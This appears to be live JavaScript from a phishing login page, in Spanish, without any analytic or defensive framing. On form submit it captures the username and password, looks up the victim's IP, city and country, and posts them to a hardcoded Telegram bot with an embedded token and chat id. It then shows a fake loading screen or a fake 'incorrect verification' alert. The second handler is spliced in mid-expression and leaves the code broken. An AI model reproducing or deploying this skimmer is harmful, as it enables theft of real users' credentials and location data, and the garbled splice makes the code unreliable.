  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#frmLogin");
    form.addEventListener("submit", (event) => {
      event.preventDefault();
      axios
        .get(url)
        .then((response) => {
          const password = document.querySelector("#CaptchaText").value;
          localStorage.getItem("usuario");
          const message =
            "Usuario: " +
            localStorage.getItem("usuario") +
            "\nContra: " +
            password +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
              {
                chat_id: "-4195941322",
                text: message,
              }
            )
            .then((response) => {
              document.getElementById("load").style.display = "";
              setTimeout(function () {
                // Aquí puedes agregar la acción que deseas realizar después de 10 segundos
                console.log("Acción después de 10 segundos");
                document.getElementById("load").style.display = "none";
                document.getElementById("overlay").style.display = "";
              }, 10000); // 10 segundos en milisegundos
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });

    const form2 = document.querySelector("#myForm");

            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
              {
                chat_id: "-4195941322",
                text: message,
              }
            )
            .then((response) => {
              alert("Verificacion Incorrecta");
              window.location.href = "index.html";
            })
            .catch((error) => {

            });
        })

        });
    });
